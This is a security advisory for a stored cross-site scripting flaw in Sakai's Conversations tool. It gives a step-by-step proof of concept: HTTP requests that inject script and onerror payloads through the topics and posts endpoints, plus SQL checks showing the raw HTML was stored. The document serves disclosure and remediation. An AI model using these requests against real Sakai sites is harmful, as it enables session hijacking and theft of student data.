# [H] Sakai Conversations has a Stored XSS Issue

## Summary
Severity: High
Advisory: GHSA-w2x5-gv52-9ccv
CVE: CVE-2026-54049
CWE: CWE-79
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-08-24
Source: https://github.com/advisories/GHSA-w2x5-gv52-9ccv
Type: github-advisory

## Affected
- Maven: `org.sakaiproject.conversations:sakai-conversations-impl` — affected >=23.0
- Maven: `org.sakaiproject.kernel:sakai-kernel-impl` — affected >=23.0
- Maven: `org.sakaiproject.rubrics:rubrics-impl` — affected >=23.0

## Details
### Summary

The Sakai Conversations tool stores topic and post messages without HTML sanitization, and the frontend renders them using LitElement's `unsafeHTML()` directive, resulting in stored cross-site scripting (XSS). Any authenticated user with access to a site that has the Conversations tool enabled can inject arbitrary HTML and JavaScript that executes in the browsers of all other users who view that topic or post.


### Description

The Conversations REST API endpoint `POST /api/sites/{siteId}/topics` accepts a `message` field in the JSON request body. The service layer (`ConversationsServiceImpl`) stores the message directly to the database (`conv_topics.MESSAGE`) without invoking `FormattedText.processFormattedText()` or any equivalent HTML sanitizer.

The same issue affects post replies via `POST /api/sites/{siteId}/topics/{topicId}/posts` and comments stored in `conv_comments`.

On the frontend, `SakaiTopic.js`, `SakaiPost.js`, and `SakaiComment.js` all render the `message` field using LitElement's `unsafeHTML()` directive:

- `SakaiPost.js` lines 429, 432: `${unsafeHTML(this.post.message)}`
- `SakaiTopic.js` line 679: `${unsafeHTML(this.topic.message)}`
- `SakaiComment.js` line 148: `${unsafeHTML(this.comment.message)}`

Unlike other Sakai tools (Announcements, Assignments, Resources) which call `FormattedText.processFormattedText()` before persisting user content, the Conversations implementation has no equivalent protection at storage time or render time.

### Proof of Concept

**Setup:** Admin/instructor session on a site with the Conversations tool enabled (siteId `BELP_275K_7418`).

**Step 1 - Inject XSS payload in topic:**

```
POST /api/sites/BELP_275K_7418/topics HTTP/1.1
Host: localhost:9107
Cookie: SAKAIID=<authenticated-session>
Content-Type: application/json

{"title":"XSS Test Topic","message":"<img src=x onerror=alert(1)>","type":"QUESTION","visibility":"SITE","draft":false}
```

Response: HTTP 200, `"message":"<img src=x onerror=alert(1)>"` - raw HTML stored.

**Step 2 - Verify stored in database:**

```sql
SELECT TOPIC_ID, TITLE, MESSAGE FROM conv_topics
WHERE TOPIC_ID='e4c599c2-bd32-4364-9cbd-a5c9c102edfb';
-- Result: MESSAGE = <img src=x onerror=alert(1)>
```

**Step 3 - Inject XSS payload in post reply:**

```
POST /api/sites/BELP_275K_7418/topics/e4c599c2-bd32-4364-9cbd-a5c9c102edfb/posts HTTP/1.1
Host: localhost:9107
Cookie: SAKAIID=<authenticated-session>
Content-Type: application/json

{"message":"<script>alert(document.cookie)<\/script>","siteId":"BELP_275K_7418"}
```

Response: HTTP 200, `"message":"<script>alert(document.cookie)</script>"` - raw script stored.

**Step 4 - Verify in database:**

```sql
SELECT POST_ID, MESSAGE FROM conv_posts
WHERE POST_ID='e3cf7aed-c630-448a-89bb-27a8baacd269';
-- Result: MESSAGE = <script>alert(document.cookie)</script>
```

When any site member loads the Conversations view, the LitElement web component fetches the stored messages via the REST API and renders them with `unsafeHTML()`, causing the injected scripts and event handlers to execute.

### Impact

An attacker with any site membership (student role or higher) can:
- Perform actions on behalf of victims
- Exfiltrate gradebook data and course content
- In a university context with hundreds of students per course, a single malicious post can compromise all enrolled students simultaneously

### Status / timeline:
- 2026-06-02: Fix committed to master (`2696b4b48cbef2e81512f52f84f7477adff78b27`)
- Release pending.

## References
- https://github.com/sakaiproject/sakai/security/advisories/GHSA-w2x5-gv52-9ccv
- https://github.com/sakaiproject/sakai/commit/2696b4b48cbef2e81512f52f84f7477adff78b27
- https://github.com/sakaiproject/sakai
- https://github.com/sakaiproject/sakai/releases/tag/23.5
